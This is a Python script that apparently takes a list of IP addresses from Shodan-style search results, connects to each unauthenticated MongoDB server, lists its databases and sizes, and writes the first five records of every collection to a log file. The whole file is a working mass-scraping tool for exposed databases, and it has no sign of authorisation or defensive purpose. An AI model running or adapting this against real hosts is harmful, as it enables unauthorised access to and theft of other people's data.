# -*- coding: utf-8 -*-
import json
import pymongo

a=open("search.json",'r')
try:
    out=open("./mongoOut.log",'a')
except:
    print('-h\t\tpython3 xx.py /root/download/out.txt')
li=[]
for l in a.readlines():
 data=json.loads(l)
 li.append(data['ip_str'])
a.close()

def getDBSize(ip,out):
    client = pymongo.MongoClient(ip,serverSelectionTimeoutMS=5000, socketTimeoutMS=5000)
    for i in client.list_database_names():
        db=client[i]
        status = db.command("dbstats")
        datasize = int(status['dataSize'] / 1024 /1024)
        if datasize>=10 or True:
            print(ip+'\t'+i+'\t'+str(datasize)+'MB')
            for c in db.list_collection_names():
                col=db[c].find({})
                out.write(str(ip)+'\n')
                for x in range(5):
                    out.write('\t'+str(col.next())+'\n')
    client.close()

for ip in li:
    try:
        getDBSize(ip,out)
    except:
        pass
